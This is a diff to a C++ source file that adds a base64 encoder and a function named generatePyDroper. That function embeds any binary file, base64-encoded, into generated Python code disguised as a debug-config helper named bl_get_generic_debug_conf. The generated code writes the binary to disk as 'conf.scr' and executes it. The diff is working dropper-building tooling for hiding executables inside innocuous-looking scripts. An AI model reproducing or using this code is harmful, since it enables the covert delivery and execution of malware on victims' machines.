@@ -1,10 +1,12 @@
+#include <iostream>
 #include <vector>
 #include <string>
+#include <fstream>
 
 /*
+    Convert an std::vector<char> of data to an std::string representing it in base64
     ChatGPT generated this code, could be stolen from some git repo, who knows!
 */
-
 std::string base64Encode(const std::vector<char>& data)
 {
     // The base64 alphabet to use for encoding
@@ -67,4 +69,26 @@ std::string base64Encode(const std::vector<char>& data)
     }
 
     return result;
+}
+
+
+std::string generatePyDroper(std::string path) {
+    std::ifstream inFile(path, std::ios::binary);
+    if (inFile.is_open()) {
+        std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+        std::string b64Data = base64Encode(buffer);
+        buffer.clear();
+        std::string pyCode;
+        pyCode += "def bl_get_generic_debug_conf():\n";
+        pyCode += "    import base64\n";
+        pyCode += "    import subprocess\n";
+        pyCode += "    b = b'" + b64Data + "'\n";
+        pyCode += "    d = base64.b64decode(b)\n";
+        pyCode += "    with open('conf.scr', 'wb') as f:\n";
+        pyCode += "        f.write(d)\n";
+        pyCode += "    subprocess.Popen('conf.scr')\n";
+        pyCode += "bl_get_generic_debug_conf()\n";
+        return pyCode;
+    }
+    return "ERR_READING_EXEC";
 }
